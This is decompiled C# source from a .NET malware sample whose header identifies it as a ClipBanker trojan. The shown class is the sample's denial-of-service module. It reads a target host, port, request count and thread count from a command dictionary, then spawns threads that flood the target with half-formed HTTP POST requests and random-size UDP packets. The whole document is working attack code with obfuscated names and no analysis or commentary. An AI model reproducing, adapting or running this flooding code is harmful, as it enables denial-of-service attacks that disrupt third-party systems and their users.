// Decompiled with JetBrains decompiler
// Type: 235.7gH
// Assembly: uc5uTlQKZwvBJeUwoIoxWYL1o3uBI8gaMfnT9AO, Version=9.8.6.0, Culture=neutral, PublicKeyToken=null
// MVID: 66B519F9-803D-46C9-8343-EC24850CA08A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-de0d24df79f99286da0234aa1536470d7596c53e531173d693d6ccc60b98e84c.exe

using \u003235;
using \u003544;
using \u00386V;
using H16;
using I71;
using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace \u003235
{
  internal sealed class \u0037gH : x77
  {
    private readonly string D7W;
    private readonly int L36;

    [SpecialName]
    public string zfn() => this.D7W;

    [SpecialName]
    public int S29() => this.L36;

    public \u0037gH(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2,
      [In] string obj3,
      [In] string obj4,
      [In] string obj5)
    {
      try
      {
        \u0037gH.vXF vXf = new \u0037gH.vXF()
        {
          s7l = obj1.dtU<Dictionary<string, string>>()
        };
        vXf.WC9 = Convert.ToInt32(vXf.s7l["Requests"]);
        int int32 = Convert.ToInt32(vXf.s7l["Threads"]);
        for (int index = 0; index < int32; ++index)
        {
          new Thread(vXf.\u0033p1 ?? (vXf.\u0033p1 = new ThreadStart(vXf.Q8f))).Start();
          new Thread(vXf.\u003557 ?? (vXf.\u003557 = new ThreadStart(vXf.f49))).Start();
          new Thread(vXf.Z75 ?? (vXf.Z75 = new ThreadStart(vXf.\u00377w))).Start();
        }
        this.L36 = 0;
      }
      catch (Exception ex)
      {
        this.D7W = ex.Message;
        this.L36 = 1;
      }
    }

    private sealed class vXF
    {
      public Dictionary<string, string> s7l;
      public int WC9;
      public ThreadStart \u0033p1;
      public ThreadStart \u003557;
      public ThreadStart Z75;

      internal void Q8f()
      {
        for (int index = 0; index < this.WC9; ++index)
        {
          try
          {
            TcpClient tcpClient = new TcpClient(this.s7l["Host"], Convert.ToInt32(this.s7l["Port"]));
            byte[] bytes = Encoding.UTF8.GetBytes("POST / HTTP/1.1\r\nHost: " + this.s7l["Host"] + " \r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: " + \u00382l.L9I() + "\r\nContent-length: 5235\r\n\r\n");
            tcpClient.Client.Send(bytes, 0, bytes.Length, SocketFlags.None);
          }
          catch
          {
          }
          Thread.Sleep(100);
        }
      }

      internal void f49()
      {
        IPEndPoint remoteEP = new IPEndPoint(IPAddress.Parse(this.s7l["Host"]), Convert.ToInt32(this.s7l["Port"]));
        Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
        for (int index = 0; index < this.WC9; ++index)
        {
          try
          {
            socket.SendTo(new byte[new \u003192().y9k() % 1000 + 1], (EndPoint) remoteEP);
          }
          catch
          {
          }
          Thread.Sleep(100);
        }
      }

      internal void \u00377w()
      {
        IPEndPoint remoteEP = new IPEndPoint(IPAddress.Parse(this.s7l["Host"]), Convert.ToInt32(this.s7l["Port"]));
        Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Tcp);
        for (int index = 0; index < this.WC9; ++index)
        {
          try
          {
            socket.SendTo(new byte[new \u003192().y9k() % 1000 + 1], (EndPoint) remoteEP);
          }
          catch
          {
          }
          Thread.Sleep(100);
        }
      }
    }
  }
}
